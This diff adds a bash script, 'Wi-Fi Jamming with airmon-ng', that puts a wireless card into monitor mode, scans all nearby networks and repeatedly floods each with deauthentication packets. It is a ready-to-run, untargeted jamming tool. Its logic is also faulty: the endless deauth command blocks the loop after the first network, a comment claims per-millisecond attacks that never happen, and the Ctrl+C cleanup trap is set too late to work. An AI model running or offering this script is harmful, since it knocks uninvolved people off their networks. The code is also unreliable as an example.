@@ -1,0 +1,89 @@
+#!/bin/bash
+
+# Function to install aircrack-ng if not found
+install_aircrack_ng() {
+    if ! command -v airmon-ng &> /dev/null; then
+        echo "[*] airmon-ng not found, installing..."
+        sudo apt update
+        sudo apt install aircrack-ng -y
+    else
+        echo "[*] airmon-ng is already installed."
+    fi
+}
+
+# Function to start monitor mode using airmon-ng
+start_airmon_ng() {
+    echo "[*] Starting airmon-ng on $1..."
+    sudo airmon-ng start $1
+    sleep 2
+    INTERFACE="$1mon"
+    echo "[*] Interface set to $INTERFACE in monitor mode."
+}
+
+# Function to stop monitor mode and return to normal mode
+stop_airmon_ng() {
+    echo "[*] Stopping airmon-ng and returning to normal mode..."
+    sudo airmon-ng stop $INTERFACE
+    sudo ip link set $INTERFACE down
+    sudo ip link set $INTERFACE up
+    echo "[*] Interface $INTERFACE is back to normal mode."
+}
+
+# Function to scan networks and perform deauth on all connected clients
+scan_and_attack() {
+    while true; do
+        # Scan all networks and get the BSSIDs
+        echo "[*] Scanning for Wi-Fi networks..."
+        networks=$(sudo iw dev $INTERFACE scan | grep "BSS" | awk '{print $2}')
+        
+        if [ -z "$networks" ]; then
+            echo "[*] No networks found. Retrying..."
+            sleep 5
+            continue
+        fi
+
+        echo "[*] Networks found: $networks"
+
+        # Loop through each network (BSSID) and attack it
+        for network in $networks; do
+            echo "[*] Deauthing clients from network with BSSID: $network"
+            sudo aireplay-ng --deauth 0 -a $network $INTERFACE
+            sleep 0.001 # Attack every millisecond
+        done
+        
+        # Wait 1 minute before repeating the process
+        echo "[*] Attack complete. Waiting 1 minute before scanning again..."
+        sleep 60
+    done
+}
+
+# Script main menu
+echo "====================================="
+echo "   Wi-Fi Jamming with airmon-ng"
+echo "====================================="
+echo "[1] Start automatic jamming"
+echo "[2] Exit"
+echo "====================================="
+read -p "Choose an option: " option
+
+case $option in
+    1)
+        # Install aircrack-ng if not installed
+        install_aircrack_ng
+        read -p "Enter the wireless interface (e.g., wlan0): " interface
+        sudo ip link set $interface up
+        start_airmon_ng $interface
+        scan_and_attack
+        ;;
+    2)
+        echo "Exiting script."
+        exit 0
+        ;;
+    *)
+        echo "Invalid option. Exiting."
+        exit 1
+        ;;
+esac
+
+# Handling the Ctrl+C exit scenario
+trap "echo 'Exiting script...'; stop_airmon_ng; exit 0" SIGINT
